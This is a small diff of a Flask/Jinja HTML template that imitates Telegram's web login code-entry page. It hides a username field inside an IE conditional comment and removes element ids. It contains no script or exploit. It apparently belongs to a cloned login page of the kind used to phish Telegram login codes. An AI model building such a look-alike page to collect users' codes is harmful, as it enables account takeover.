@@ -40,9 +40,8 @@
 </head>
 
 <body class="animation-level-2 is-left-column-shown">
-	<div id="username" style="display: none;">{{username}}</div>
 	<!--[if IE]>
-
+	<div id="username" style="display: none;">{{username}}</div>
     <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
   <![endif]-->
 	<div class="whole" id="auth-pages" style="">
@@ -58,7 +57,7 @@
 							<div class="media-sticker-wrapper"><img class="rlottie" src="{{ url_for('static',filename='anim.gif') }}"></div>
 						</div>
 						<div class="phone-wrapper">
-							<h4 class="phone" id="phone">{{phone}}</h4><img id="edit" class="phone-edit tgico-edit" src="{{ url_for('static',filename='edit.png') }}"></div>
+							<h4 class="phone">{{phone}}</h4><img class="phone-edit tgico-edit" src="{{ url_for('static',filename='edit.png') }}"></div>
 						<p class="subtitle sent-type"><span class="i18n">We have sent you a message in Telegram<br>with the code.</span></p>
 						<div class="input-wrapper">
 							<div class="input-field">
